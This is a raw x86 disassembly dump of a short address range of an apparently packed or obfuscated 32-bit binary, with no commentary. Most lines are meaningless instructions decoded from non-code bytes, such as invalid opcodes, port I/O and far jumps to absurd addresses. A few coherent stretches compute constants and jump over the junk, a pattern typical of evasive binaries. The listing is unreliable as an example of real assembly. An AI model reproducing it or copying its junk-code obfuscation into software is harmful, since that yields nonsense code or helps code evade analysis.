  40cf97:	test   DWORD PTR [esi],edi
  40cf99:	test   DWORD PTR ds:0xc690103c,edi
  40cf9f:	ins    BYTE PTR es:[edi],dx
  40cfa0:	scas   eax,DWORD PTR es:[edi]
  40cfa1:	inc    esp
  40cfa2:	out    0x7c,al
  40cfa4:	mov    dh,BYTE PTR [edx-0x1]
  40cfa7:	ja     0x40d00d
  40cfa9:	mov    ebx,0x5bb938c3
  40cfae:	add    eax,0x827c4f60
  40cfb3:	sbb    DWORD PTR [eax-0xf23ef75],0x780465c7
  40cfbd:	retf   0x77e1
  40cfc0:	pop    ebp
  40cfc1:	stc    
  40cfc2:	mov    bh,0xe7
  40cfc4:	mov    edi,0x966e39e5
  40cfc9:	je     0x40cfb8
  40cfcb:	out    0xea,eax
  40cfcd:	fidivr WORD PTR [ecx]
  40cfcf:	inc    esi
  40cfd0:	cmc    
  40cfd1:	or     dl,bh
  40cfd3:	test   DWORD PTR [edi],edx
  40cfd5:	(bad)  
  40cfd6:	scas   al,BYTE PTR es:[edi]
  40cfd7:	je     0x40cfc2
  40cfd9:	dec    ecx
  40cfda:	in     al,dx
  40cfdb:	enter  0xe478,0x44
  40cfdf:	test   al,0x4d
  40cfe1:	inc    ebp
  40cfe2:	mov    ds:0xde7dee4a,al
  40cfe7:	cmp    edi,DWORD PTR es:[edi-0x5d018053]
  40cfee:	adc    BYTE PTR es:[ecx-0x460ba4dd],0x1f
  40cff6:	push   edx
  40cff7:	dec    eax
  40cff8:	push   0x3a8830d9
  40cffd:	mov    WORD PTR [edi],ss
  40cfff:	pushf  
  40d000:	xor    eax,0x458b5339
  40d005:	or     al,0xe9
  40d007:	mov    ebp,0xf7000000
  40d00c:	sar    ebp,0x83
  40d00f:	(bad)  
  40d010:	mov    edi,0x328bf5ff
  40d015:	mov    esp,0xc50bcd1c
  40d01a:	fsubp  st(6),st
  40d01c:	mov    DWORD PTR [eax],eax
  40d01e:	add    BYTE PTR [ebp-0x5f000000],ah
  40d024:	push   ebp
  40d025:	xor    BYTE PTR [esi-0x6043af4b],dh
  40d02b:	cdq    
  40d02c:	cli    
  40d02d:	adc    al,0xa1
  40d02f:	in     eax,dx
  40d030:	in     al,dx
  40d031:	jl     0x40d031
  40d033:	sub    BYTE PTR [di],cl
  40d036:	sahf   
  40d037:	xor    eax,0xf65b6b48
  40d03c:	xchg   esi,eax
  40d03d:	fwait
  40d03e:	in     al,dx
  40d03f:	cmp    ebp,DWORD PTR [eax+0x64]
  40d042:	(bad)  
  40d043:	dec    eax
  40d044:	fcomp  QWORD PTR [eax-0x12e89c46]
  40d04a:	pop    edx
  40d04b:	push   ss
  40d04c:	psubsb mm7,QWORD PTR [edx-0x5c]
  40d050:	ss mov bh,0xbb
  40d053:	jno    0x40d066
  40d055:	or     eax,0x9ff59494
  40d05a:	pushf  
  40d05b:	nop
  40d05c:	mov    al,ds:0x9c6c2e0f
  40d061:	xchg   ebp,eax
  40d062:	imul   esi,edi,0x23
  40d065:	aad    0xcc
  40d067:	sub    DWORD PTR [eax-0x35],eax
  40d06a:	pop    edx
  40d06b:	std    
  40d06c:	ss loop 0x40d025
  40d06f:	xor    esi,DWORD PTR [ebx+0x112ad5ca]
  40d075:	icebp  
  40d076:	out    0x16,eax
  40d078:	mov    dl,0x50
  40d07a:	mov    ebx,ss
  40d07c:	jno    0x40d0c2
  40d07e:	in     al,dx
  40d07f:	mov    DWORD PTR [eax+0x11338a95],ecx
  40d085:	pop    ebp
  40d086:	xchg   ebp,eax
  40d087:	stos   DWORD PTR es:[edi],eax
  40d088:	adc    ah,al
  40d08a:	cld    
  40d08b:	or     al,0xf8
  40d08d:	repz lds esp,FWORD PTR [eax]
  40d090:	sahf   
  40d091:	push   ebp
  40d092:	dec    esp
  40d093:	inc    ecx
  40d094:	sahf   
  40d095:	ja     0x40d08a
  40d097:	adc    ah,BYTE PTR [eax]
  40d099:	cli    
  40d09a:	mov    edi,0xfbcadd27
  40d09f:	add    dh,BYTE PTR [esi+0x6efcd719]
  40d0a5:	fmul   st,st(5)
  40d0a7:	pop    eax
  40d0a8:	popa   
  40d0a9:	cmp    al,0xe1
  40d0ab:	rcr    ecx,0x73
  40d0ae:	test   DWORD PTR [edx-0x2268c608],edi
  40d0b4:	sub    al,0x44
  40d0b6:	ins    DWORD PTR es:[edi],dx
  40d0b7:	push   eax
  40d0b8:	test   BYTE PTR [edi+0x31],ch
  40d0bb:	xchg   esi,eax
  40d0bc:	ror    DWORD PTR [ebx-0x25],1
  40d0bf:	mov    ecx,DWORD PTR [edx-0x77]
  40d0c2:	xor    cl,BYTE PTR [eax+0x7816693d]
  40d0c8:	mov    esi,DWORD PTR [ebp-0x34]
  40d0cb:	or     eax,0x2d3d
  40d0d0:	and    eax,esi
  40d0d2:	mov    esi,DWORD PTR [ebp-0x30]
  40d0d5:	add    eax,0x6a32
  40d0da:	xor    eax,esi
  40d0dc:	mov    esi,DWORD PTR ds:0x42f1b4
  40d0e2:	jmp    0x40d1a4
  40d0e7:	enter  0xdfc3,0x5
  40d0eb:	fistp  WORD PTR ds:0x749ccfda
  40d0f1:	mov    cl,0x5f
  40d0f3:	sbb    DWORD PTR [ecx+0x1b],ebx
  40d0f6:	lahf   
  40d0f7:	xchg   ebx,eax
  40d0f8:	mov    al,BYTE PTR [eax]
  40d0fa:	add    BYTE PTR [ebp-0x55000000],ah
  40d100:	sar    DWORD PTR [edi+0x3a4e514c],1
  40d106:	mov    ds:0xeef03281,al
  40d10b:	inc    DWORD PTR [esi]
  40d10d:	jno    0x40d178
  40d10f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d110:	mov    bl,cl
  40d112:	fsub   DWORD PTR [edi-0x2ab51e5b]
  40d118:	adc    eax,0xc5e5b754
  40d11d:	sahf   
  40d11e:	add    BYTE PTR es:[edx+0x2e],ch
  40d122:	test   eax,0xb48781f3
  40d127:	inc    edi
  40d128:	push   esp
  40d129:	mov    ebx,0x6f791339
  40d12e:	cmp    eax,0x972488ab
  40d133:	mov    bl,0x90
  40d135:	dec    esp
  40d136:	dec    esp
  40d137:	xchg   esp,eax
  40d138:	repz push eax
  40d13a:	xor    DWORD PTR [ecx-0x49b8a7d6],0xffffffa4
  40d141:	cmc    
  40d142:	mov    dl,0x20
  40d144:	adc    BYTE PTR [ebx],0xed
  40d147:	cld    
  40d148:	or     al,0x4c
  40d14a:	sbb    BYTE PTR [eax+ecx*2],ah
  40d14d:	xor    cx,ax
  40d150:	lea    esp,[edi+0x271b0bb]
  40d156:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d157:	or     BYTE PTR [edi-0x23],ah
  40d15a:	lahf   
  40d15b:	xchg   BYTE PTR ds:[ebp-0x2],dl
  40d15f:	in     eax,0x78
  40d161:	jle    0x40d1b3
  40d163:	push   eax
  40d164:	jo     0x40d1d1
  40d166:	adc    al,0x28
  40d168:	jle    0x40d117
  40d16a:	mov    DWORD PTR [edx+0x37],esp
  40d16d:	dec    edi
  40d16e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d16f:	pop    ecx
  40d170:	rcl    DWORD PTR [ebp+0x3a90d267],cl
  40d176:	repz (bad) 
  40d179:	pop    ss
  40d17a:	addr16 and al,0x9b
  40d17e:	xor    esi,eax
  40d180:	fcomp  QWORD PTR [esi+0x45]
  40d183:	retf   0x98a6
  40d186:	rcl    BYTE PTR [eax+edi*8-0x77cd694a],1
  40d18d:	fisubr DWORD PTR [eax+edi*8]
  40d190:	jg     0x40d209
  40d192:	aad    0x13
  40d194:	cmp    al,0xc0
  40d196:	dec    ecx
  40d197:	mov    ecx,0x94cd40cc
  40d19c:	mov    ah,0x5a
  40d19e:	xchg   ecx,eax
  40d19f:	sar    DWORD PTR [esp+ebp*4-0x49744b6d],1
  40d1a6:	les    eax,FWORD PTR [ecx]
  40d1a8:	add    BYTE PTR [eax],al
  40d1aa:	sub    esi,eax
  40d1ac:	mov    eax,DWORD PTR [ebp+0x10]
  40d1af:	mov    al,BYTE PTR [edx+eax*1]
  40d1b2:	jmp    0x40d274
  40d1b7:	mov    esi,0xfb547904
  40d1bc:	jge    0x40d17d
  40d1be:	out    dx,al
  40d1bf:	fucomip st,st(2)
  40d1c1:	xchg   edi,eax
  40d1c2:	fimul  WORD PTR [ecx+0x380d028f]
  40d1c8:	mov    eax,DWORD PTR [eax]
  40d1ca:	add    BYTE PTR [ebp+0x3000000],ah
  40d1d0:	and    al,0x1f
  40d1d2:	xchg   esi,eax
  40d1d3:	pop    ebp
  40d1d4:	icebp  
  40d1d5:	mov    ebx,ds
  40d1d7:	mov    ebx,0xa3d9ec41
  40d1dc:	int    0x4d
  40d1de:	fs int 0xc7
  40d1e1:	dec    eax
  40d1e2:	sbb    DWORD PTR [esi-0x34],0x11
  40d1e6:	mov    ch,0xdd
  40d1e8:	push   ebx
  40d1e9:	dec    esp
  40d1ea:	out    dx,eax
  40d1eb:	push   edx
  40d1ec:	push   edx
  40d1ed:	mov    ah,BYTE PTR [ebx-0x43]
  40d1f0:	jecxz  0x40d23b
  40d1f2:	sub    ch,BYTE PTR [edi-0x7d3ad80f]
  40d1f8:	or     cl,BYTE PTR [esi-0x39]
  40d1fb:	jns    0x40d250
  40d1fd:	mov    ebx,0xede2e301
  40d202:	mov    ebp,0x79dc1337
  40d207:	jno    0x40d222
  40d209:	sbb    ebx,ecx
  40d20b:	rcr    BYTE PTR ds:0x8f103387,cl
  40d211:	jb     0x40d290
  40d213:	out    0xcf,al
  40d215:	js     0x40d1c5
  40d217:	dec    edi
  40d218:	repz in eax,0xc5
  40d21b:	sub    ecx,DWORD PTR [edi]
  40d21d:	jmp    0x2fc213e9
  40d222:	mov    al,ds:0xf01cfc44
  40d227:	lds    edx,FWORD PTR [ebx+ecx*2]
  40d22a:	inc    esi
  40d22b:	pop    esp
  40d22c:	sbb    DWORD PTR [esi+0x4a204d3e],0x909fa1a9
  40d236:	aas    
  40d237:	push   ds
  40d238:	retf   0xff7
  40d23b:	push   eax
  40d23c:	lods   eax,DWORD PTR ds:[esi]
  40d23d:	(bad)  
  40d23e:	pmaxsw xmm2,XMMWORD PTR [ebx+0x1ef3a9b7]
  40d246:	cmp    eax,0x73efda74
  40d24b:	jae    0x40d267
  40d24d:	arpl   WORD PTR [ecx+0xf22beb7],si
  40d253:	in     eax,0x35
  40d255:	mov    al,ds:0x745b25a7
  40d25a:	xchg   esp,eax
  40d25b:	daa    
  40d25c:	imul   ecx,esp,0xb90a0038
  40d262:	inc    ebp
  40d263:	int    0x9e
  40d265:	jae    0x40d1eb
  40d267:	mov    BYTE PTR [ebx-0x24f97548],dh
  40d26d:	ror    DWORD PTR [ebx-0x4a],1
  40d270:	adc    BYTE PTR [ecx-0x7b7720f8],ch
  40d276:	push   cs
  40d277:	dec    ebx
  40d278:	dec    eax
  40d279:	add    BYTE PTR [eax],al
  40d27b:	mov    eax,DWORD PTR [ebp-0x2c]
  40d27e:	mov    edx,DWORD PTR [ebp-0x28]
  40d281:	jmp    0x40d343
  40d286:	cdq    
  40d287:	loope  0x40d27b
  40d289:	add    edx,edi
  40d28b:	adc    edi,ebx
  40d28d:	stc    
  40d28e:	dec    edx
  40d28f:	dec    eax
  40d290:	mov    ebp,0xe565a495
  40d295:	(bad)  
  40d297:	mov    eax,DWORD PTR [eax]
  40d299:	add    BYTE PTR [ebp-0x51000000],ah
  40d29f:	loopne 0x40d299
  40d2a1:	imul   edi,DWORD PTR [ecx+0x105920af],0x8db09e1c
  40d2ab:	ins    BYTE PTR es:[edi],dx
  40d2ac:	icebp  
  40d2ad:	jnp    0x40d2c2
  40d2af:	aam    0xd4
  40d2b1:	fucomip st,st(7)
  40d2b3:	cmc    
  40d2b4:	mov    dl,0x1c
  40d2b6:	pop    ds
  40d2b7:	data16 adc al,0x82
  40d2ba:	cmc    
  40d2bb:	mov    ebp,0x62a9393d
  40d2c0:	cmp    eax,0x98b4e6fe
  40d2c5:	mov    ecx,0x2e5e3d05
  40d2ca:	mov    cl,0x17
  40d2cc:	mov    edx,0xe082aeeb
  40d2d1:	or     al,0xa8
  40d2d3:	ins    BYTE PTR es:[edi],dx
  40d2d4:	test   DWORD PTR [eax],edx
  40d2d6:	and    eax,0x5c763fca
  40d2db:	add    al,0x18
  40d2dd:	adc    eax,0xa7364d00
  40d2e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2e3:	ja     0x40d26f
  40d2e5:	pop    ecx
  40d2e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2e7:	lahf   
  40d2e8:	loope  0x40d283
  40d2ea:	pop    ds
  40d2eb:	cmc    
  40d2ec:	hlt    
  40d2ed:	lods   al,BYTE PTR ds:[esi]
  40d2ee:	adc    BYTE PTR [edx+esi*2-0x2a],bh
  40d2f2:	dec    esp
  40d2f3:	add    al,0xcb
  40d2f5:	imul   bl
  40d2f7:	arpl   WORD PTR [esi+0x61],ax
  40d2fa:	pop    ebp
  40d2fb:	cmp    cl,BYTE PTR ds:0xefd20958
  40d301:	pop    esp
  40d302:	add    ebp,esp
  40d304:	mov    edx,0x72178f95
  40d309:	je     0x40d2a4
  40d30b:	pushf  
  40d30c:	cld    
  40d30d:	ins    BYTE PTR es:[edi],dx
  40d30e:	inc    edx
  40d30f:	and    BYTE PTR [esi+0x2876bc7a],ch
  40d315:	es adc al,0xc2
  40d318:	iret   
  40d319:	popf   
  40d31a:	bound  edi,QWORD PTR [eax]
  40d31c:	mov    edx,0x318326cc
  40d321:	or     DWORD PTR [ebx-0x580fe8cb],ebp
  40d327:	jb     0x40d2e2
  40d329:	mov    eax,ds:0x48b36d84
  40d32e:	inc    edx
  40d32f:	inc    eax
  40d330:	sbb    eax,0x82e433c0
  40d335:	dec    ebp
  40d336:	iret   
  40d337:	ret    0x89ce
  40d33a:	cdq    
  40d33b:	mov    al,ds:0x2455c3ad
  40d340:	xchg   edi,eax
  40d341:	bound  ebp,QWORD PTR [ebx]
  40d343:	imul   eax,eax,0x199
  40d349:	or     eax,0x2882
  40d34e:	and    eax,edx
  40d350:	xor    eax,0x2371
  40d355:	jmp    0x40d417
  40d35a:	jmp    0xffff:0xf72bd609
  40d361:	leave  
  40d362:	dec    edx
  40d363:	sub    esp,eax
  40d365:	xchg   ebp,eax
  40d366:	addr16 mov edx,0x8c82ccf5
  40d36c:	add    BYTE PTR [eax],al
  40d36e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d36f:	add    BYTE PTR [eax],al
  40d371:	add    BYTE PTR [esi-0x7a],bh
  40d374:	imul   ebx,DWORD PTR ds:0x7bcf13b0,0xea6237f5
  40d37e:	mov    edi,0x9e419b11
  40d383:	dec    esi
  40d384:	jge    0x40d3d7
  40d386:	adc    edx,DWORD PTR [eax+0x1b]
  40d389:	mov    ebx,0x27ef6013
  40d38e:	fisub  DWORD PTR [ebp-0x740757fd]
  40d394:	repz pop esp
  40d396:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d397:	mov    WORD PTR [ebp-0x244b7f29],?
  40d39d:	in     eax,dx
  40d39e:	ins    BYTE PTR es:[edi],dx
  40d39f:	into   
  40d3a0:	cs (bad) 
  40d3a2:	jl     0x40d343
  40d3a4:	inc    ebp
  40d3a5:	or     BYTE PTR [edx+0x456cb367],dh
  40d3ab:	mov    dl,0x55
  40d3ad:	add    eax,0xc2e5d10
  40d3b2:	jp     0x40d335
  40d3b4:	push   esp
  40d3b5:	jne    0x40d404
  40d3b7:	mov    esp,0xdc062589
  40d3bc:	mov    al,0xef
  40d3be:	test   DWORD PTR ds:0x4fd343d,eax
  40d3c4:	pop    edx
  40d3c5:	jbe    0x40d409
  40d3c7:	std    
  40d3c8:	cld    
  40d3c9:	bnd jb 0x40d441
  40d3cc:	icebp  
  40d3cd:	mov    edi,0xc1683230
  40d3d2:	ins    BYTE PTR es:[edi],dx
  40d3d3:	adc    BYTE PTR [edx+0x38],ah
  40d3d6:	shl    BYTE PTR [edx-0x49fc185f],cl
  40d3dc:	scas   al,BYTE PTR es:[edi]
  40d3dd:	out    0x5c,al
  40d3df:	ins    BYTE PTR es:[edi],dx
  40d3e0:	dec    edx
  40d3e1:	pop    esp
  40d3e2:	bound  ecx,QWORD PTR [esi+0x4c]
  40d3e5:	dec    ecx
  40d3e6:	jecxz  0x40d44f
  40d3e8:	jo     0x40d453
  40d3ea:	mov    ah,0x3
  40d3ec:	jb     0x40d397
  40d3ee:	cdq    
  40d3ef:	mov    fs,WORD PTR ds:0x2e53cd47
  40d3f5:	or     BYTE PTR [ecx+edi*2],0x54
  40d3f9:	xchg   edi,eax
  40d3fa:	xchg   edi,eax
  40d3fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3fc:	scas   eax,DWORD PTR es:[edi]
  40d3fd:	sti    
  40d3fe:	popf   
  40d3ff:	fimul  DWORD PTR gs:[eax]
  40d402:	std    
  40d403:	dec    ebx
  40d404:	push   0x4c
  40d406:	adc    BYTE PTR [ebx+0xf],ch
  40d409:	aam    0x4c
  40d40b:	call   0x6e0b4949
  40d410:	test   eax,0x7e1f1264
  40d415:	lahf   
  40d416:	std    
  40d417:	imul   eax,eax,0x7272
  40d41d:	jmp    0x40d4df
  40d422:	push   ebp
  40d423:	pop    ebx
  40d424:	in     al,dx
  40d425:	inc    edx
  40d426:	out    dx,al
  40d427:	idiv   edi
  40d429:	pop    edi
  40d42a:	(bad)
  40d42d:	int    0x72
  40d42f:	dec    ebp
  40d430:	mov    al,0x1c
  40d432:	daa    
  40d433:	lea    eax,[eax]
  40d435:	add    BYTE PTR [ebp-0x74000000],ah
  40d43b:	cmp    dh,ah
  40d43d:	popa   
  40d43e:	icebp  
  40d43f:	call   0x47df6bb3
  40d444:	sbb    al,0x12
  40d446:	cmp    edx,DWORD PTR [ebx]
  40d448:	jnp    0x40d403
  40d44a:	iret   
  40d44b:	cmove  eax,DWORD PTR [ebx+0x238eb2ba]
  40d452:	add    BYTE PTR [eax],ch
  40d454:	test   BYTE PTR [eax+0x14],dl
  40d457:	ss ins BYTE PTR es:[edi],dx
  40d459:	ins    DWORD PTR es:[edi],dx
  40d45a:	lahf   
  40d45b:	mov    edx,esp
  40d45d:	and    ebx,esp
  40d45f:	push   ds
  40d460:	push   esi
  40d461:	sub    bl,dl
  40d463:	xchg   esi,eax
  40d464:	in     al,dx
  40d465:	iret   
  40d466:	or     edi,DWORD PTR [edi+0x6b]
  40d469:	push   edx
  40d46a:	push   ecx
  40d46b:	xchg   edi,eax
  40d46c:	pop    ecx
  40d46d:	push   ebp
  40d46e:	or     ebp,DWORD PTR [ecx-0x60ad35d9]
  40d474:	ror    DWORD PTR [ecx],0xf7
  40d477:	icebp  
  40d478:	shl    esi,cl
  40d47a:	dec    ebp
  40d47b:	hlt    
  40d47c:	or     BYTE PTR ds:[ecx-0xf9de854],bh
  40d483:	sbb    al,0x27
  40d485:	inc    esi
  40d486:	fs fs sbb eax,0x4a25ea8a
  40d48d:	sbb    eax,0x544de6ab
  40d492:	imul   edi,DWORD PTR [ecx],0x44
  40d495:	jae    0x40d49e
  40d497:	aaa    
  40d498:	inc    eax
  40d499:	xchg   ebp,eax
  40d49a:	sbb    esp,DWORD PTR ds:0xb71fc7dc
  40d4a0:	repz es or eax,0xc3253616
  40d4a7:	gs jmp 0x7ec538b6
  40d4ad:	pop    es
  40d4ae:	push   0xfffffff8
  40d4b0:	pop    ebx
  40d4b1:	inc    esi
  40d4b2:	mov    eax,0x208de1e0
  40d4b7:	ret    
  40d4b8:	mov    eax,ds:0x81a9f066
  40d4bd:	jbe    0x40d4de
  40d4bf:	jmp    0x31a3ed0
  40d4c4:	and    BYTE PTR [ecx+0x7a],al
  40d4c7:	ja     0x40d463
  40d4c9:	cs dec ebx
  40d4cb:	mov    DWORD PTR [edi+esi*4],eax
  40d4ce:	jecxz  0x40d548
  40d4d0:	push   esp
  40d4d1:	(bad)  
  40d4d2:	adc    al,0xd5
  40d4d4:	sbb    edx,0xffffffe1
  40d4d7:	xor    bl,BYTE PTR [ecx]
  40d4d9:	push   0x31
  40d4db:	enter  0x8784,0x93
  40d4df:	xor    edx,edx
  40d4e1:	mov    esi,0x21b9ea52
  40d4e6:	div    esi
  40d4e8:	jmp    0x40d5aa
  40d4ed:	cmp    bh,ch
  40d4ef:	fs and ah,bh
  40d4f2:	mov    ebx,0x3aeffd7e
  40d4f7:	push   es
  40d4f8:	pop    edi
  40d4f9:	add    al,0x56
  40d4fb:	mov    al,ah
  40d4fd:	int3   
  40d4fe:	lea    eax,[eax]
  40d500:	add    BYTE PTR [ebp-0x37000000],ah
  40d506:	fdivr  st,st(3)
  40d508:	xchg   ebp,eax
  40d509:	mov    gs,WORD PTR [edx+0x79]
  40d50c:	and    al,0x27
  40d50e:	add    eax,0x256fe2c9
  40d513:	sbb    dl,BYTE PTR [edx+0x15]
  40d516:	jo     0x40d4e6
  40d518:	sahf   
  40d519:	and    BYTE PTR [esi-0x15],cl
  40d51c:	popf   
  40d51d:	(bad)  
  40d51e:	push   esp
  40d51f:	sahf   
  40d520:	inc    eax
  40d521:	and    DWORD PTR [esi+0x33],0xffffffb0
  40d525:	jecxz  0x40d591
  40d527:	pop    esi
  40d528:	pop    ss
  40d529:	aas    
  40d52a:	retf   
  40d52b:	xchg   BYTE PTR [ebx-0x5608ceb5],bl
  40d531:	cld    
  40d532:	test   al,0x19
  40d534:	pop    esp
  40d535:	addr16 ss in al,0x1d
  40d539:	xchg   edx,eax
  40d53a:	inc    eax
  40d53b:	xchg   BYTE PTR [edx-0x72],ch
  40d53e:	or     dl,BYTE PTR ds:0x3f35f665
  40d544:	mov    ebp,0x8eb6ee17
  40d549:	aam    0xaf
  40d54b:	test   BYTE PTR [ecx],dh
  40d54d:	mov    ch,0x54
  40d54f:	jle    0x40d560
  40d551:	dec    ecx
  40d552:	stos   DWORD PTR es:[edi],eax
  40d553:	fdivr  DWORD PTR [esi+0x2336fe1]
  40d559:	push   eax
  40d55a:	fsubr  QWORD PTR [esi-0x2c]
  40d55d:	aaa    
  40d55e:	fnstcw WORD PTR [eax-0x15be3b51]
  40d564:	je     0x40d532
  40d566:	dec    esp
  40d567:	rol    BYTE PTR fs:[edi],0xa5
  40d56b:	aad    0x26
  40d56d:	cs pop ebp
  40d56f:	xchg   ebx,eax
  40d570:	std    
  40d571:	sub    DWORD PTR [edi+0x4c3d042f],eax
  40d577:	inc    ebp
  40d578:	stos   BYTE PTR es:[edi],al
  40d579:	mov    ch,0x41
  40d57b:	cmp    BYTE PTR [ebp+edi*2+0xa],0xdd
  40d580:	test   DWORD PTR [ebx-0x9],ebx
  40d583:	cmp    ebp,DWORD PTR [ecx+0x722c98cf]
  40d589:	mov    esi,0x670c2e3c
  40d58e:	loope  0x40d556
  40d590:	out    dx,al
  40d591:	mov    bh,0xa9
  40d593:	(bad)  
  40d594:	pop    esp
  40d595:	jae    0x40d58b
  40d597:	or     BYTE PTR ds:0x534bdb12,ch
  40d59d:	les    edx,FWORD PTR [ebx]
  40d59f:	dec    esp
  40d5a0:	push   ecx
  40d5a1:	push   esp
  40d5a2:	dec    esi
  40d5a3:	pop    ebp
  40d5a4:	rol    BYTE PTR [esi],0xa8
  40d5a7:	adc    dh,dh
  40d5a9:	imul   eax,DWORD PTR [ebx],0xffffffc8
  40d5ac:	mov    eax,DWORD PTR [ebp-0x24]
  40d5af:	sub    eax,0x1759
  40d5b4:	imul   eax,eax,0x141c
  40d5ba:	or     eax,0x655f
  40d5bf:	sub    eax,0x812bc9b
  40d5c4:	cmp    ecx,eax
  40d5c6:	jbe    0x40cd8b
  40d5cc:	pop    esi
  40d5cd:	leave  
  40d5ce:	ret    0xc
  40d5d1:	jmp    0x40d6a8
  40d5d6:	sbb    al,0xe2
  40d5d8:	adc    dh,BYTE PTR [eax-0x2]
  40d5db:	lock jle 0x40d5cc
  40d5de:	nop
  40d5df:	test   eax,ebx
  40d5e1:	ins    DWORD PTR es:[edi],dx
  40d5e2:	jo     0x40d58a
  40d5e4:	push   edx
  40d5e5:	lahf   
  40d5e6:	jno    0x40d576
  40d5e8:	add    BYTE PTR [eax],al
  40d5ea:	mov    edx,0xca000000
  40d5ef:	sti    
  40d5f0:	xlat   BYTE PTR ds:[ebx]
  40d5f1:	mov    ch,0x97
  40d5f3:	pushf  
  40d5f4:	mov    ah,0x92
  40d5f6:	inc    esp
  40d5f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5f8:	and    DWORD PTR [esi-0x33],edx
  40d5fb:	cmc    
  40d5fc:	out    dx,eax
  40d5fd:	mov    dh,0xa5
  40d5ff:	fwait
  40d600:	int3   
  40d601:	xchg   edi,eax
  40d602:	mov    al,ds:0xa794c8c9
  40d607:	dec    DWORD PTR [ebp-0x4c]
  40d60a:	(bad)  
  40d60b:	hlt    
  40d60c:	mov    eax,0xc53dd9e3
  40d611:	push   edx
  40d612:	pop    esp
  40d613:	inc    esi
  40d614:	jle    0x40d680
  40d616:	retf   0x9ca6
  40d619:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d61a:	out    dx,eax
  40d61b:	jae    0x40d5e8
  40d61d:	and    eax,0x8c0538a5
  40d622:	fdivp  st(2),st
  40d624:	mov    esp,0x5155eaf7
  40d629:	xchg   ecx,eax
  40d62a:	push   0xdb480207
  40d62f:	daa    
  40d630:	rcr    DWORD PTR [ecx],0x37
  40d633:	and    DWORD PTR [eax+0x38],ebp
  40d636:	mov    esp,0x4b30bdf8
  40d63b:	jae    0x40d681
  40d63d:	loopne 0x40d6be
  40d63f:	mov    esp,0x5a6159b7
  40d644:	pop    eax
  40d645:	js     0x40d646
  40d647:	fisub  WORD PTR [ebp+ebp*8-0x6281fe49]
  40d64e:	xchg   edx,eax
  40d64f:	iret   
  40d650:	inc    esi
  40d651:	aad    0xa2
  40d653:	mov    eax,0xd0b92761
  40d658:	call   0x40e:0xace9be36
  40d65f:	push   eax
  40d660:	loopne 0x40d65c
  40d662:	xor    eax,0xb253e259
  40d667:	je     0x40d688
  40d669:	mov    ebp,0x7f7fdbd7
  40d66e:	dec    eax
  40d66f:	pop    ss
  40d670:	leave  
  40d671:	xor    eax,0xeb9e63fa
  40d676:	and    ebp,0x3fdfcb52
  40d67c:	loopne 0x40d620
  40d67e:	jne    0x40d653
  40d680:	(bad)  
  40d681:	and    cl,BYTE PTR [edi]
  40d683:	leave  
  40d684:	int3   
  40d685:	mov    al,ds:0xa4593e4c
  40d68a:	jle    0x40d6e6
  40d68c:	dec    DWORD PTR cs:[eax+ebx*1+0x45]
  40d691:	push   ebp
  40d692:	jno    0x40d639
  40d694:	mov    ah,0x6a
  40d696:	jne    0x40d6cd
  40d698:	add    eax,0xcf0c7a05
  40d69d:	das    
  40d69e:	retf   
  40d69f:	into   
  40d6a0:	out    dx,eax
  40d6a1:	jae    0x40d677
  40d6a3:	cs push ds
  40d6a5:	push   esp
  40d6a6:	xchg   eax,eax
  40d6a8:	mov    eax,0xe032f64b
  40d6ad:	mov    edx,0xffffdedc
  40d6b2:	ret    
  40d6b3:	push   ebp
  40d6b4:	mov    ebp,esp
  40d6b6:	sub    esp,0x48
  40d6b9:	mov    DWORD PTR [ebp-0x20],0x20f9f
  40d6c0:	or     DWORD PTR ds:0x42f568,edi
  40d6c6:	mov    DWORD PTR [ebp-0x28],0x4c33
  40d6cd:	mov    DWORD PTR [ebp-0x24],0xab4
  40d6d4:	mov    ecx,DWORD PTR [ebp-0x28]
  40d6d7:	xor    DWORD PTR ds:0x42f5cc,edi
  40d6dd:	mov    eax,0xffffe77a
  40d6e2:	sub    eax,ecx
  40d6e4:	xor    ecx,ecx
  40d6e6:	xor    ecx,DWORD PTR ds:0x42e004
  40d6ec:	mov    ecx,DWORD PTR [ecx]
  40d6ee:	add    DWORD PTR ds:0x42f624,ecx
  40d6f4:	add    eax,DWORD PTR [ebp-0x24]
  40d6f7:	mov    ecx,DWORD PTR [ebp-0x20]
  40d6fa:	inc    DWORD PTR ds:0x42f5e4
  40d700:	imul   eax,eax,0x10fb
  40d706:	and    DWORD PTR ds:0x42f648,0x46e4
  40d710:	xor    edx,edx
  40d712:	and    DWORD PTR ds:0x42f5b4,0x42f530
  40d71c:	div    ecx
  40d71e:	cmp    DWORD PTR ds:0x42f568,0x0
  40d725:	ja     0x40d73e
  40d72b:	jmp    0x40d73e
  40d730:	push   DWORD PTR [ebp-0x28]
  40d733:	push   0x3ade
  40d738:	call   DWORD PTR ds:0x4387a0
  40d73e:	mov    ecx,0x7950
  40d743:	jmp    0x40d81f
  40d748:	gs pop esp
  40d74a:	dec    ebp
  40d74b:	mov    ds:0xdeefb37d,eax
  40d750:	inc    ebx
  40d751:	(bad)  
  40d752:	fst    QWORD PTR [ebp-0x5bbe5787]
  40d758:	sub    ecx,DWORD PTR [edi+0xbf0000]
  40d75e:	add    BYTE PTR [eax],al
  40d760:	test   DWORD PTR [eax-0x10],esp
  40d763:	and    DWORD PTR [edx-0x27c3bbca],eax
  40d769:	xrelease mov DWORD PTR [ebp+0x7c7cd28d],ebx
  40d770:	out    0xac,eax
  40d772:	cmc    
  40d773:	cmp    DWORD PTR [eax],0xffffffbd
  40d776:	popa   
  40d777:	pop    esi
  40d778:	retf   0x7905
  40d77b:	rcr    DWORD PTR [edi],0x8f
  40d77e:	mov    al,0xc7
  40d780:	(bad)  
  40d781:	hlt    
  40d782:	(bad)  
  40d783:	call   0x3e09:0x930b36fb
  40d78a:	sbb    DWORD PTR [edi],edx
  40d78c:	xlat   BYTE PTR ds:[ebx]
  40d78d:	outs   dx,DWORD PTR ds:[esi]
